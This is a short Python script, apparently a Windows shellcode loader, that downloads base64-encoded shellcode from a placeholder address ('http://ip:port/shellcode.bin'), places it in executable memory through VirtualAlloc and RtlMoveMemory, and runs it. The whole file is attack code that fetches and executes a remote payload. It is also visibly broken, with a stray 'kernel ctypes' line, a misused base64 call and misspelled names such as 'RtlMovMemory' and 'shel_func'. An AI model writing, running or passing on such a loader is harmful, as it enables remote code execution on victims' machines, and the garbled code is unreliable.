from urllib import request

import base64
import ctypes

kernel ctypes

kernel32 = ctypes.windll.kernel32

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decode(response.read())
    return shellcode

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctype.void_p
    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
            
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMovMemory(ptr, buf, length)
    return ptr

def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)

    ptr = write_memory(buffer)

    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shel_func()

if __name__ == '__main__':
    url = "http://ip:port/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)
